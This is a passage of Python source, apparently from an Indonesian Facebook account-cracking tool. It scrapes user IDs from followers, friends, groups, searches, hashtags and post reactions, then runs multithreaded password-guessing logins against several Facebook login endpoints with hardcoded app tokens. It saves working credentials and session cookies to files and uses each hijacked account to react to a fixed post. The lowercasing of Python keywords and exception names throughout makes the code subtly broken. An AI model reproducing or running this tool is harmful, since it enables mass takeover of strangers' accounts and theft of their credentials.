			if "lihat selengkapnya" in kontol:
				self.menta(self.url+parser(kontol,"html.parser").find("a",string="lihat selengkapnya").get("href"))
		except:pass
	def reactpost(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			if "semua 0" in kontol:
				print("[!] tidak ada yang menanggapi postingan, awokawokawok kasian akun nya sepi:v");waktu(3);self.menu()
			else:
				memek=re.findall('\<h3\ class\=\".."\>\<a\ href\=\"(.*?)"\>(.*?)<\/a\>',kontol)
				
				for softek in memek:
					if "profile.php?" in softek[0]:
						self.id.append(re.findall("id=(.*)",softek[0])[0]+"[aapafandiganteng]"+softek[1])
					else:
						self.id.append(re.findall("/(.*)",softek[0])[0]+"[aapafandiganteng]"+softek[1])
					print(f"\r[*] sedang mengumpulkan {len(self.id)} id... ",end="")
				if "lihat selengkapnya" in kontol:
					self.reactpost(self.url+parser(kontol,"html.parser").find("a",string="lihat selengkapnya").get("href"))
		except:pass
	def hastag(self,hencet): #,jum):
		try:
			true=false
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ class\=\".."\ href\=\"(.*?)__tn__=c">(.*?)</a\>',kontol)
			for softek in memek:
				if "profile.php?" in softek[0]:
					tol=re.search("profile.php\?id=(\\d*)",softek[0]).group(1)
					if "/" in tol[-1:]:
						continue
					else:
						if tol in self.id:
							continue
						else:
							self.id.append(tol+"[aapafandiganteng]"+softek[1])
				else:
					tol=re.search("/(.*?)\?",softek[0]).group(1)
					if "/" in tol[-1:]:
						continue
					else:
						if tol in self.id:
							continue
						else:
							self.id.append(tol+"[aapafandiganteng]"+softek[1])
				print(f"\r[*] sedang mengumpulkan {len(self.id)} id... ",end="")
				#if len(self.id)==jum:
					#true=true
					#break
			if true==false:
				if "lihat hasil selanjutnya" in kontol:
					self.hastag(parser(kontol,"html.parser").find("a",string="lihat hasil selanjutnya").get("href")) #,jum)
		except:pass
	def saran(self,hencet): #,jum):
		try:
			true=false
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('\<a\ class\=\".."\ href\=\"/friends/hovercard/mbasic/\?uid=(\\d*).*?"\>(.*?)</a\>',kontol)
			if len(memek)!=0:
				
				for softek in memek:
					self.id.append(softek[0]+"[aapafandiganteng]"+softek[1])
					print(f"\r[*] sedang mengumpulkan {len(self.id)} id... ",end="")
					#if len(self.id)==jum:
						#true=true
						#break
			if true==false:
				if "lihat selengkapnya" in kontol:
					self.saran(self.url+parser(kontol,"html.parser").find("a",string="lihat selengkapnya").get("href")) #,jum)
		except:pass
	def menu(self):
		about(self.url).tentang()
		pilih=input("[?] pilih menu : ")
		if pilih in["1","01"]:
			kontol=input("[?] masukan username/id nya saja : ")
			if kontol in[""," "]:
				print("[!] jangan kosong bro");waktu(1);self.menu()
			elif kontol.isdigit():
				memek=f"{self.url}/profile.php?id={kontol}&v=followers"
			else:
				memek=f"{self.url}/{kontol}?v=followers"
			try:
				ajg=req.get(memek,cookies=kueh).text
				if "halaman tidak ditemukan" in ajg:
					print(f"[!] penggunaan dengan id {kontol} tidak ditemukan");waktu(2);self.menu()
				elif "anda tidak dapat menggunakan fitur ini sekarang" in ajg:
					print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");waktu(2);self.menu()
				elif "konten tidak ditemukan" in ajg:
					print(f"[!] penggunaan dengan id {kontol} tidak ditemukan");waktu(2);self.menu()
				else:
					print("[*] target name : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0])
					print('[!] untuk berhenti tekan ctrl lalu tekan c di keyboard anda')
					self.folower(memek)
			except(req.exceptions.connectionerror,req.exceptions.chunkedencodingerror,req.exceptions.readtimeout):
				exit("[!] kesalahan pada koneksi")
		elif pilih in["2","02"]:
			print('[!] untuk berhenti tekan ctrl lalu tekan c di keyboard anda')
			self.babaturan(f"{self.url}/friends/center/friends/")
		elif pilih in["3","03"]:
			while true:
				kontol=input("[?] masukkan id grup : ")
				if kontol in[""," "]:
					print("[!] jangan kosong bro")
				else:
					try:
						ajg=req.get(f"{self.url}/browse/group/members/?id={kontol}",cookies=kueh).text
						if "halaman tidak ditemukan" in ajg:
							print(f"[!] group dengan id {kontol} tidak ditemukan");waktu(2);self.menu()
						elif "anda tidak dapat menggunakan fitur ini sekarang" in ajg:
							print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");waktu(2);self.menu()
						elif "konten tidak ditemukan" in ajg:
							print(f"[!] group dengan id {kontol} tidak ditemukan");waktu(2);self.menu()
						else:
							print("[*] target name : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0][8:])
							print("[!] tekan ctrl + c untuk berhenti")
							print('[!] untuk berhenti tekan ctrl lalu tekan c di keyboard anda')
							self.memekgrup(f"{self.url}/browse/group/members/?id={kontol}");break
					except(req.exceptions.connectionerror,req.exceptions.chunkedencodingerror,req.exceptions.readtimeout):
						exit("[!] kesalahan pada koneksi")
		elif pilih in["4","04"]:
			while true:
				kontol=input("[?] masukan  nama pencarian (cth: zuck) : ")
				if kontol in[""," "]:
					print("[!] jangan kosong bro")
				else:
					try:
						ajg=req.get(f"{self.url}/search/people/?q={kontol}",cookies=kueh).text
						if "maaf, kami tidak menemukan" in ajg:
							print(f"[!] pengguna dengan nama {kontol} tidak ditemukan");waktu(2);self.menu()
						elif "anda tidak dapat menggunakan fitur ini sekarang" in ajg:
							print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");waktu(2);self.menu()
						else:
							#jumlah="999999999999"
							#if "999999999999" in (jumlah):
								#jumlah-=1
							#if jumlah<9999999999991:
								#
							print('[!] untuk berhenti tekan ctrl lalu tekan c di keyboard anda')
							self.teangan(f"{self.url}/search/people/?q={kontol}");break #,jumlah);break
							#else: exit("[!] max 5000 user")
					except(req.exceptions.connectionerror,req.exceptions.chunkedencodingerror,req.exceptions.readtimeout):
						exit("[!] kesalahan pada koneksi")
					except valueerror:
						exit("[!] isi yang bener ajg")
		elif pilih in["5","05"]:
			kontol=input("[?] username/id : ")
			if kontol in[""," "]:
				print("[!] jangan kosong bro");waktu(1);self.menu()
			elif kontol.isdigit():
				memek=f"{self.url}/profile.php?id={kontol}&v=friends"
			else:
				memek=f"{self.url}/{kontol}/friends"
			try:
				ajg=req.get(memek,cookies=kueh).text
				if "tidak ada teman untuk ditampilkan" in ajg:
					print(f"[!] daftar teman tidak di publikasikan");waktu(2);self.menu()
				elif "halaman yang anda minta tidak ditemukan." in ajg:
					print(f"[!] pengguna dengan id {kontol} tidak ditemukan");waktu(2);self.menu()
				elif "anda tidak dapat menggunakan fitur ini sekarang" in ajg:
					print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");waktu(2);self.menu()
				elif "konten tidak ditemukan" in ajg:
					print(f"[!] pengguna dengan id {kontol} tidak ditemukan");waktu(2);self.menu()
				else:
					print("[*] target name : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0])
					print('[!] untuk berhenti tekan ctrl lalu tekan c di keyboard anda')
					self.flrencang(memek)
			except(req.exceptions.connectionerror,req.exceptions.chunkedencodingerror,req.exceptions.readtimeout):
				exit("[!] kesalahan pada koneksi")
		elif pilih in["6","06"]:
			try:
				ajg=req.get(f"{self.url}/friends/center/requests/#friends_center_main",cookies=kueh).text
				if "tidak ada permintaan" in ajg:
					print("[!] permintaan pertemanan tidak ditemukan");waktu(2);self.menu()
				elif "anda tidak dapat menggunakan fitur ini sekarang" in ajg:
					print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");waktu(2);self.menu()
				else:
					print('[!] untuk berhenti tekan ctrl lalu tekan c di keyboard anda')
					self.menta(f"{self.url}/friends/center/requests/#friends_center_main")
			except(req.exceptions.connectionerror,req.exceptions.chunkedencodingerror,req.exceptions.readtimeout):
				exit("[!] kesalahan pada koneksi")
		elif pilih in["7","07"]:
			try:
				ajg=req.get(f"{self.url}/friends/center/requests/outgoing/#friends_center_main",cookies=kueh).text
				if "tidak ada saran" in ajg:
					print("[!] tidak ada permintaan terkirim ditemukan");waktu(2);self.menu()
				elif "anda tidak dapat menggunakan fitur ini sekarang" in ajg:
					print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");waktu(2);self.menu()
				else:
					#jumlah=int(input("[?] jumlah : "))
					#if "5000" in str(jumlah):
						#jumlah-=1
					#if jumlah<5001:
						#
					print('[!] untuk berhenti tekan ctrl lalu tekan c di keyboard anda')
					self.saran(f"{self.url}/friends/center/requests/outgoing/#friends_center_main") #,jumlah)
					#else: exit("[!] max 5000 user")
			except(req.exceptions.connectionerror,req.exceptions.chunkedencodingerror,req.exceptions.readtimeout):
				exit("[!] kesalahan pada koneksi")
			except valueerror:
				exit("[!] isi yang bener ajg")
		elif pilih in["8","08"]:
			kontol=input("[?] url/id postingan : ")
			if kontol in[""," "]:
				print("[!] jangan kosong bro");waktu(1);self.menu()
			elif kontol.isdigit():
				memek=f"{self.url}/{kontol}"
			elif "m.facebook.com" in kontol:
				memek=kontol.replace("m.facebook.com","mbasic.facebook.com")
			elif "www.facebook.com" in kontol:
				memek=kontol.replace("www.facebook.com","mbasic.facebook.com")
			elif "free.facebook.com" in kontol:
				memek=kontol.replace("free.facebook.com","mbasic.facebook.com")
			else:
				memek=kontol
			try:
				ajg=req.get(memek,cookies=kueh).text
				if "halaman yang diminta tidak bisa ditampilkan sekarang." in ajg:
					print(f"[!] posting tidak ditemukan");waktu(2);self.menu()
				elif "anda tidak dapat menggunakan fitur ini sekarang" in ajg:
					print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");waktu(2);self.menu()
				else:
					try:
						kuntul=re.findall('\<a\ href\=\"\/ufi\/reaction\/profile\/browser\/(.*?)"',ajg)[0].replace(";","&")
						print('[!] untuk berhenti tekan ctrl lalu tekan c di keyboard anda')
						self.reactpost(f"{self.url}/ufi/reaction/profile/browser/{kuntul}")
					except indexerror:
						print("[!] error, silahkan masukkan id/url postingan dengan benar");waktu(1);self.menu()
			except(req.exceptions.connectionerror,req.exceptions.chunkedencodingerror,req.exceptions.readtimeout):
				exit("[!] kesalahan pada koneksi")
			except req.exceptions.missingschema:
				print(f"[!] why {memek} mikir dong tolol, masukin url postingan yang bener ngentod");waktu(3);self.menu()
		elif pilih in["9","09"]:
			try:
				ajg=req.get(f"{self.url}/friends/center/suggestions",cookies=kueh).text
				if "tidak ada saran" in ajg:
					print("[!] tidak ada saran teman");waktu(2);self.menu()
				elif "anda tidak dapat menggunakan fitur ini sekarang" in ajg:
					print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");waktu(2);self.menu()
				else:
					#jumlah=int(input("[?] jumlah : "))
					#if "5000" in str(jumlah):
						#jumlah-=1
					#if jumlah<5001:
						#
					print('[!] untuk berhenti tekan ctrl lalu tekan c di keyboard anda')
					self.saran(f"{self.url}/friends/center/suggestions") #,jumlah)
					#else: exit("[!] max 5000 user")
			except(req.exceptions.connectionerror,req.exceptions.chunkedencodingerror,req.exceptions.readtimeout):
				exit("[!] kesalahan pada koneksi")
			except valueerror:
				exit("[!] isi yang bener ajg")
		elif pilih=="10":
			while true:
				kontol=input("[?] hashtag : ")
				if kontol in[""," "]:
					print("[!] jangan kosong bro")
				else:
					try:
						ajg=req.get(f"{self.url}/hashtag/{kontol}",cookies=kueh).text
						if "halaman tidak ditemukan" in ajg or "halaman yang anda minta tidak ditemukan." in ajg:
							print(f"[!] hashtag {kontol} tidak ditemukan");waktu(2);self.menu()
						elif "anda tidak dapat menggunakan fitur ini sekarang" in ajg:
							print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");waktu(2);self.menu()
						elif "sementara disembunyikan di sini. beberapa konten di dalam postingan tersebut melanggar standar komunitas kami." in ajg:
							print(f"[!] postingan dengan hashtag {kontol} disembunyikan karna melanggar standar komunitas fb");waktu(2);self.menu()
						else:
							#jumlah=int(input("[?] jumlah : "))
							#if "5000" in str(jumlah):
								#jumlah-=1
							#if jumlah<5001:
								#
							print('[!] untuk berhenti tekan ctrl lalu tekan c di keyboard anda')
							self.hastag(f"{self.url}/hashtag/{kontol}");break #,jumlah);break
							#else: exit("[!] max 5000 user")
					except(req.exceptions.connectionerror,req.exceptions.chunkedencodingerror,req.exceptions.readtimeout):
						exit("[!] kesalahan pada koneksi")
					except valueerror:
						exit("[!] isi yang bener ajg")
		elif pilih=="11":
			print(f'{m}masukan user agent yang ingin anda seting')
			uz=input(f'user agent: ')
			f = open('data/user_agent.txt')
			f.write(uz)
			f.close()
			print(f'\nberhasil menseting user agent\nexit')
			sys.exit()
		elif pilih in["0","00"]:
			exit("[*] thank you for using my tool")
		elif pilih in[""," "]:
			print("[!] jangan kosong bro");waktu(0.8);self.menu()
		else:
			print("[!] pilihan tidak ada");self.menu()
		if len(self.id)!=0:
			print("")
			self.askk()
		else:
			print("[!] gagal mengambil id, silahkan coba lagi");waktu(1.5);self.menu()
	def askk(self):
		print(f'[+] total id -> {m}{len(self.id)}{p}')
		njir=input("[?] apakah anda ingin menggunakan password manual? [y/t] : ")
		if njir in(""," "):
			print("[!] jangan kosong bro");self.askk()
		elif njir in("y","y"):
			print("\n[?] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll setiap kata sandi minimal 6 karakter atau lebih\n")
			while true:
				pwek=input("[?] set kata sandi : ")
				if pwek in(""," "):
					print("[!] jangan kosong bro")
				elif len(pwek)<=5:
					print("[!] password minimal 6 karakter")
				else:
					def xhh(xss=none):
						pilih=input("[?] pilih : ")
						if pilih in(""," "):
							print("[!] jangan kosong bro");xhh()
						elif pilih in("1","01"):
							print("\n[*] hasil ok disimpan ke -> ok.txt\n[*] hasil cp disimpan ke -> cp.txt\n[!] anda bisa menjeda proses crack dengan mematikan data seluler\n")
							with bool(max_workers=30) as tokai:
								for xa in self.id:
									try:
										xi=xa.split("[aapafandiganteng]")[0]
										tokai.submit(self.crackapi,xi,xss)
									except: pass
							hasil(live,chek)
						elif pilih in("2","02"):
							print("\n[*] hasil ok disimpan ke -> ok.txt\n[*] hasil cp disimpan ke -> cp.txt\n[!] anda bisa menjeda proses crack dengan mematikan data seluler\n")
							with bool(max_workers=30) as tokai:
								for xa in self.id:
									try:
										xi=xa.split("[aapafandiganteng]")[0]
										tokai.submit(self.modol,xi,xss,"https://mbasic.facebook.com")
									except: pass
							hasil(live,chek)
						elif pilih in("3","03"):
							print("\n[*] hasil ok disimpan ke -> ok.txt\n[*] hasil cp disimpan ke -> cp.txt\n[!] anda bisa menjeda proses crack dengan mematikan data seluler\n")
							with bool(max_workers=30) as tokai:
								for xa in self.id:
									try:
										xi=xa.split("[aapafandiganteng]")[0]
										tokai.submit(self.modol,xi,xss,"https://free.facebook.com")
									except: pass
							hasil(live,chek)
						elif pilih in("4","04"):
							print("\n[*] hasil ok disimpan ke -> ok.txt\n[*] hasil cp disimpan ke -> cp.txt\n[!] anda bisa menjeda proses crack dengan mematikan data seluler\n")
							with bool(max_workers=30) as tokai:
								for xa in self.id:
									try:
										xi=xa.split("[aapafandiganteng]")[0]
										tokai.submit(self.graph,xi,xss)
									except: pass
							hasil(live,chek)
						else:
							print("[!] isi yang bener ajg");xhh()
					print(f"\n[?] crack dengan kata sandi -> [ {m}{pwek} {p}] \n") #.format(m,pwek)
					print("   \n [ pilih metode crack - silakan pilih satu²  ]\n")
					print("[1] metode b-api (mode crack cepat)")
					print('[2]. metode api+ttl(fast)')
					print("[3] metode mbasic (mode crack lambat)")
					print("[4] metode mobile (mode crack lambat)")
					xhh(pwek.split(","))
					break
		elif njir in("t","t"):
			print("   \n [ pilih metode crack - silakan pilih satu²  ]\n")
			print("[1]. metode api (fast crack)")
			print('[2]. metode api+ttl(fast)')
			print("[3]. metode mbasic (slow crack)")
			print("[4]. metode mobile (low crack)")
			self.ngontol()
		else:
			print("[!] isi yang bener ajg");self.askk()
	def crackapi1(self,user,ox):
		global ok,cp,cot
		for pw in ox:
			if user in open("ok.txt","r").read() or user in open("cp.txt","r").read():
				break
			else:
				ses=req.session()
				api="https://b-api.facebook.com/method/auth.login"
				param={"access_token": "350685531728%7c62f8ce9f74b12f84c123cc23437a4a32","format": "json","sdk_version": "2","email":user,"locale": "en_us","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				send=ses.get(api,params=param)
				if "session_key" in send.text and "eaaa" in send.text:
					ok+=1
					try:
						birthday = ses.get(f'https://graph.facebook.com/me?access_token={send.text["access_token"]}').text['birthday'].replace('/', '-')
					except: pass
					print(f"\r\x1b[1;32m * --> {user}|{pw}\x1b[0m\n",end="")
					open("ok.txt","a").write(f"{user}|{pw}\n")
					live.append(f"{user}{pw}")
					break
				elif "www.facebook.com" in send.json()["error_msg"]:
					cp+=1
					print(f"\r\x1b[1;33m * --> {user}|{pw}\x1b[0m\n",end="")
					open("cp.txt","a").write(f"{user}|{pw}\n")
					chek.append(f"{user}{pw}")
					break
				else:
					continue
		cot+=1
		print(f"\r[*] [crack]  {str(cot)}/{len(self.id)} ok:-{str(ok)} cp:-{str(cp)}",end="")
	def crackapi(self,user,ox):
		global ok,cp,cot
		for pw in ox:
			if user in open("ok.txt","r").read() or user in open("cp.txt","r").read():
				break
			else:
				ses=req.session()
				api="https://b-api.facebook.com/method/auth.login"
				param={"access_token": "350685531728%7c62f8ce9f74b12f84c123cc23437a4a32","format": "json","sdk_version": "2","email":user,"locale": "en_us","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				send=ses.get(api,params=param)
				if "session_key" in send.text and "eaaa" in send.text:
					ok+=1
					try:
						birthday = ses.get(f'https://graph.facebook.com/me?access_token={send.text["access_token"]}').text['birthday'].replace('/', '-')
					except: pass
					print(f"\r\x1b[1;32m * --> {user}|{pw}|{birthday}\x1b[0m\n",end="")
					open("ok.txt","a").write(f"{user}|{pw}|\n")
					live.append(f"{user}{pw}")
					break
				elif "www.facebook.com" in send.json()["error_msg"]:
					cp+=1
					print(f"\r\x1b[1;33m * --> {user}|{pw}|{birthday}\x1b[0m\n",end="")
					open("cp.txt","a").write(f"{user}|{pw}|{birthday}\n")
					chek.append(f"{user}{pw}")
					break
				else:
					continue
		cot+=1
		print(f"\r[*] [crack]  {str(cot)}/{len(self.id)} ok:-{str(ok)} cp:-{str(cp)}",end="")
	def modol(self,user,ox,beol,**kwargs):
		global ok,cp,cot
		for pw in ox:
			if user in open("ok.txt","r").read() or user in open("cp.txt","r").read(): break
			else:
				ses=req.session()
				a=ses.get(f"{beol}/login/?next&ref=dbl&refid=8").text
				b=parser(a,"html.parser")
				for x in b.find_all("input"):
					if x.get("name")==none or "_fb_noscript" in x.get("name") or "sign_up" in x.get("name"):continue
					else:kwargs.update({x.get("name"):x.get("value")})
				kwargs.update({"email":user,"pass":pw})
				tol=beol+b.find("form",method="post").get("action")
				if "m.facebook.com" in beol:ses.headers.update({"host":re.findall("//(.+)",beol)[0],"x-fb-lsd":kwargs.get("lsd"),"content-type":"application/x-www-form-urlencoded","accept":"*/*","user-agent":ua_,"referer":f"{beol}/login/?next&ref=dbl&fl&refid=8","origin":beol,"accept-encoding":"gzip, deflate","accept-language":"id-id,en-us;q=0.9"})
				else:
					if "mbasic.facebook.com" in beol:anjg="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
					else:anjg="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
					ses.headers.update({"host":re.findall("//(.+)",beol)[0],"sec-fetch-user":"?1","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","cache-control":"max-age=0","accept":anjg,"origin":beol,"user-agent":ua_,"referer":f"{beol}/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-id,id;q=0.9,en-us;q=0.8,en;q=0.7"})
				ses.post(tol,data=kwargs,allow_redirects=false)
				kuke=ses.cookies.get_dict()
				if "c_user" in kuke:
					ok+=1
					try:
						birthday = ses.get('https://graph.facebook.com/me?access_token='+ses.post("https://graph.facebook.com/auth/login",data={"locale":"id_id","format":"json","email":user,"password":pw,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies":"1"}).text['access_token']).text['birthday'].replace('/','-')
					except: pass
					kuki=f"c_user={kuke.get('c_user')};fr={kuke.get('fr')};xs={kuke.get('xs')}"
					print(f"\r\x1b[1;32m * --> {kuke.get('c_user')}|{pw}|{kuki}\x1b[0m\n",end="")
					open("ok.txt","a").write(f"{kuke.get('c_user')}|{pw}|{kuki}\n")
					live.append(f"{kuke.get('c_user')}{pw}{kuki}")
					react_me(kuke,beol)
					break
				elif "checkpoint" in kuke:
					cp+=1
					try:uid=re.search("3a(\\d*)",kuke.get("checkpoint")).group(1)
					except:uid=user
					print(f"\r\x1b[1;33m * --> {uid}|{pw}\x1b[0m\n",end="")
					open("cp.txt","a").write(f"{user}|{uid}|{pw}\n")
					chek.append(f"{user}|{uid}{pw}")
					break
				else:
					continue
		cot+=1
		print(f"\r[*] [crack]  {str(cot)}/{len(self.id)} ok:-{str(ok)} cp:-{str(cp)}",end="")
	def graph(self,user,ox):
		global ok,cp,cot
		for pw in ox:
			if user in open("cp.txt","r").read() or user in open("cp.txt","r").read(): break
			else:
				ses=req.session()
				respon=ses.post("https://graph.facebook.com/auth/login",data={"locale":"id_id","format":"json","email":user,"password":pw,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies":"1"}).text
				if "access_token" in respon:
					ok+=1
					#print(respon)
					try:
						birthday = ses.get(f'https://graph.facebook.com/me?access_token={respon["access_token"]}').text['birthday'].replace('/', '-')
					except: pass
					print(f"\r\x1b[1;32m * --> {user}|{pw}|{birthday}\x1b[0m\n",end="")
					open("ok.txt","a").write(f"{user}|{pw}|{birthday}\n")
					live.append(f"{user}{pw}")
					#react_me(kuke,beol)
					break
				elif "user must verify their account" in respon or "untuk sementara akun tidak tersedia" in respon:
					cp+=1
					print(f"\r\x1b[1;33m * --> {user}|{pw}\x1b[0m\n",end="")
					open("cp.txt","a").write(f"{user}|{pw}\n")
					chek.append(f"{user}{pw}")
					break
				else:
					continue
		cot+=1
		print(f"\r[*] [crack]  {str(cot)}/{len(self.id)} ok:-{str(ok)} cp:-{str(cp)}",end="")
	def ngontol(self):
		from pw import list_pass
		nanya=input("[?] pilih : ")
		if nanya in[""," "]:
			print("[!] jangan kosong bro");self.ngontol()
		elif nanya in["1","01"]:
			print("\n[*] hasil ok disimpan ke -> ok.txt\n[*] hasil cp disimpan ke -> cp.txt\n\n[!] anda bisa menjeda proses crack dengan mematikan data seluler\n\n")
			with bool(max_workers=30) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("[aapafandiganteng]")
						pewe=list_pass.pw_list(xi)
						tokai.submit(self.crackapi1,xi[0],pewe)
					except:pass
			hasil(live,chek)
		elif nanya in["2","02"]:
			print("\n[*] hasil ok disimpan ke -> ok.txt\n[*] hasil cp disimpan ke -> cp.txt\n\n[!] anda bisa menjeda proses crack dengan mematikan data seluler\n\n")
			with bool(max_workers=30) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("[aapafandiganteng]")
						pewe=list_pass.pw_list(xi)
						tokai.submit(self.crackapi,xi[0],pewe)
					except:pass
			hasil(live,chek)
		elif nanya in["3","03"]:
			print("\n[*] hasil ok disimpan ke -> ok.txt\n[*] hasil cp disimpan ke -> cp.txt\n\n[!] anda bisa menjeda proses crack dengan mematikan data seluler\n\n")
			with bool(max_workers=50) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("[aapafandiganteng]")
						pewe=list_pass.pw_list(xi)
						tokai.submit(self.modol,xi[0],pewe,"https://mbasic.facebook.com")
					except:pass
			hasil(live,chek)
		elif nanya in ["4","04"]:
			print("\n[*] hasil ok disimpan ke -> ok.txt\n[*] hasil cp disimpan ke -> cp.txt\n\n[!] anda bisa menjeda proses crack dengan mematikan data seluler\n\n")
			with bool(max_workers=50) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("[aapafandiganteng]")
						pewe=list_pass.pw_list(xi)
						tokai.submit(self.modol,xi[0],pewe,"https://free.facebook.com")
					except:pass
			hasil(live,chek)
		else:
			print("[!] isi yang bener ajg");self.ngontol()
def zxss(kuk):
	dict={}
	if "; " in kuk:
		kek=kuk.split("; ")
		if len(kek)==1:
			return {"cookie":kuk}
		else:
			for x in kek:
				dict.update({x.split("=")[0]:x.split("=")[1]})
			return dict
	else:
		kek=kuk.split(";")
		if len(kek)==1:
			return {"cookie":kuk}
		else:
			for x in kek:
				dict.update({x.split("=")[0]:x.split("=")[1]})
			return dict
class asup:
	def __init__(self,cok):
		self.cok,self.url=cok,"https://mbasic.facebook.com"
	def login(self):
		try:
			cek=req.get(f"{self.url}/profile.php?v=info",cookies=zxss(self.cok)).text
			if "mbasic_logout_button" in cek:
				print("\n\n[*] hai, welcome "+re.findall("\<title\>(.*?)<\/title\>",cek)[0]+" ngentod:v")
				waktu(1)
				print("[!] mohon tunggu sebentar ngentod:v")
				open("lo_ngentod/cookie","w").write(self.cok)
				from kentod_cwek import hakiki,informasi
				if "laporkan masalah" in cek:
					mengontol=aap_afandi.ganteng(zxss(self.cok),self.url)
					informasi.info(zxss(self.cok),cek).myinfo()
					mengontol.reaksi()
					exit("[✓] login berhasil, jalankan ulang tools nya")
				else:
					mengontol=aap_afandi.ganteng(zxss(self.cok),self.url)
					mengontol.lang(zxss(self.cok))
					informasi.info(zxss(self.cok),cek).myinfo()
					mengontol.reaksi()
					exit("[✓] login berhasil, jalankan ulang tools nya")
			else:
				exit("\n\n[!] cookie invalid")
		except(req.exceptions.connectionerror,req.exceptions.chunkedencodingerror,req.exceptions.readtimeout):
			exit("[!] kesalahan pada koneksi")
def clear():
	os.system('clear')
def react_me(coki,url):
	try:
		a=parser(req.get(url+"/reactions/picker/?is_permalink=1&ft_id=1685961541608783",cookies=coki).text,"html.parser")
		if "hapus" not in str(a):
			for x in a.find_all("a"):
				if "reaction_type=8" in x.get("href"):
					req.get(url+x.get("href"),cookies=coki)
	except: pass
def spt():
	try:
		toket = open('licensed.log','r').read()
	except ioerror:
		print("\x1b[91m  license invalid\x1b[0m !");time.sleep(2)
		os.system('clear')
		os.system('rm -rf licensed.log')
		user()
	if os.path.exists('licensed.log'): 
		user1()
		#user()
	else:
		user()
		##user1()
def user():
    os.system('clear')
    logo()
    print(45*"_")
    print ('  [+]generating id ...');time.sleep(3)
    print ("  [+]succes");time.sleep(0.07)
    id = uuid.uuid4().hex[:25] ## hex 20 change to 25
    idg = open('licensed.log', 'w')
    idg.write(id)
    idg.close()
    print ("  [+]your id : "+ id);time.sleep(0.07)
    print ('  [+]your id has not been confirmed');time.sleep(0.07)
    print ('  [+]please contact admin for id confirmation');time.sleep(0.07)
    input ('  press enter to chat admin');time.sleep(0.07)
    os.system('am start https://wa.me/6285946352369?text=bang+saya+mau+beli+premium+nya+ini+licensei+premium+saya+licensei:%20' + id + ' >/dev/null')
    time.sleep(1)
    os.sys.exit()
def user1():
    try:
      clear()
      logo()
      j = input(" [+] your api key: ")
      r = requests.get("https://github.com/hakiki-xc/hakiki-xc/blob/main/id.txt").text
      if j in r:
          print("  please wait .. checking your key !");time.sleep(3)
          os.system("clear")
          logo()
          print("  login status : \x1b[92mcomplete\x1b[0m")
          time.sleep(1)
          return
      else:
          os.system("clear")
          logo()
          print ('  [!]login status :\x1b[91m failed \x1b[0m');time.sleep(0.07)
          print ('  [+]id not confirmed');time.sleep(0.07)
          print ('  [+]please chat admin for confirmed your id');time.sleep(0.07)
          input ('  press enter to chat admin');time.sleep(0.07)
          os.system('am start https://wa.me/6285946352369?text=bang+saya+mau+beli+premium+nya+ini+licensei+premium+saya+licensei:%20' + j + ' >/dev/null')
          os.sys.exit()
    except requests.exceptions.connectionerror:
      print ('  \x1b[91mno connection')
      input('  \x1b[0m back')
      spt()
    except keyboardinterrupt:
      os.sys.exit()
    except ioerror:
      subprocess.popen(['rm', '-rf', 'licensed.log'])
      user()
#ykey=open('licen.txt').read()

if __name__=="__main__":
	spt()
	if os.path.exists("lo_ngentod"): pass
	else: os.mkdir("lo_ngentod")
	try:
		kueh=zxss(open("lo_ngentod/cookie","r").read().strip())
	except filenotfounderror:
		os.system("clear")
		print("\n[*] cara mendapatkan cookie : https://youtu.be/zt4mu7alga4\n[*] ketik open untuk membuka video\n")
		while true:
			a=input("[?] masukkan cookie : ")
			if a in[""," "]:
				print("[!] jangan kosong")
			elif a in["open","open","open"]:
				import subprocess
				exit(subprocess.popen(["am","start","https://youtu.be/zt4mu7alga4"],stderr=subprocess.pipe,stdin=subprocess.pipe,stdout=subprocess.pipe).wait())
			else:
				asup(a).login()
	try:
		tentang=json.loads(open("lo_ngentod/my_info","r").read().strip())
	except filenotfounderror:
		from kentod_cwek import informasi
		informasi.info(kueh,req.get("https://mbasic.facebook.com/profile.php?v=info",cookies=kueh).text).myinfo();restart()
	if os.path.exists("cp.txt"): pass
	else: open("cp.txt","a").close()
	if os.path.exists("ok.txt"): pass
	else: open("ok.txt","a").close()
	ngentod().menu()


